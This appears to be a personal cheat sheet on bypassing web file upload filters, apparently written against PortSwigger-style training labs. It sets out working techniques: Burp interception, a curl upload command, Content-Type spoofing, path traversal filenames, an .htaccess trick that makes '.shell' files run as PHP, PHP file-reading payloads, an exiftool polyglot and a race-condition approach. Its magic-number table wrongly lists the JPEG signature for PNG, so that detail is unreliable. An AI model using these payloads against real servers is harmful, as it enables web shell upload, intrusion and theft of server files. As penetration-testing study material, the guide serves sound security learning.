# 

# File Upload Vulnerability

## ByPass Client Side Filterin

1. Turn of JavaScript But Make Sure the Website doesn't require Javascript in order to provide basic functionality.

2. Intercept and modify the incoming page. Using Burpsuite
   
   EX:
   
           1-Intercept on to get This Request 
           2-Right Click and choose -> Do Intercept
           3-Response This request 
           4-Forward
           5-And Delete JS code Filter

3. Send the file directly to the upload point.
   
   Why use the webpage with the filter,when you can send the file directly using a tool. like curl
   
       curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>

4. Edit Content-Type: header to
   
           1-Upload File With Accepted Extention
           2-Intercept This Request 
           3-Edit Content-Type to -> Content-Type:text/x-php or image/png -> would you want
           3-and Edit file Extention to what you want

5. File Upload via Path Traversal 
   
           Content-Disposition: form-data; name="avatar"; filename="../get_f_c.php"
           Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fget_f_c.php"
       
           GET /files/avatars/../get_f_c.php
           GET /files/avatars/..%2get_f_c.php

6. Test them using some uppercase letters
   
         pHp, .pHP5, .PhAr ...

7. using .htaccess file
   
   this file is the file of configration in appache you can add configration on it to accept any extension ike .shell , .test then you should aupload two fils file .htaccess 
   
   file One
   
       Content-Disposition: form-data; name="avatar"; filename=".htaccess"
       Content-Type: text/plain
       AddType application/x-httpd-php .shell
   
   flle Two
   
       Content-Disposition: form-data; name="avatar"; filename="shell.shell"
       Content-Type: image/png
       <?php echo file_get_contents('/path/to/target/file'); ?>

--- 

## ByPass ServerSide Filtering

1. First You have to perform a lot of testing to build up an idea of what is or is not allowed through the filter.

2. Try All Possible Extention work for The Same Thing You Want https://book.hacktricks.xyz/pentesting-web/file-upload

3. Magic Numbers
   
   see this site To Know Your Extention Magic Number
   
   https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
   
   https://en.wikipedia.org/wiki/List_of_file_signatures
   
   Use Any hex editor to Edit First bits. Like hexeditor
   
   | .jpg | ff d8 ff e0 |
   | ---- | ----------- |
   | .png | ff d8 ff e0 |
   
   or using exftool using this script
   
       exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
   
   use Command `file filename` to know if the magic Numbers work

4. Execute it before deleteing
   
    Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.
   
   That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.
   
   For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.
   
   These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code. 
   
   EX:
   
   [Lab: Web shell upload via race condition | Web Security Academy](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

5. Outher Vulnerability
   
   you can upload file to gain XXE injection,XSS by upload html files or any file 
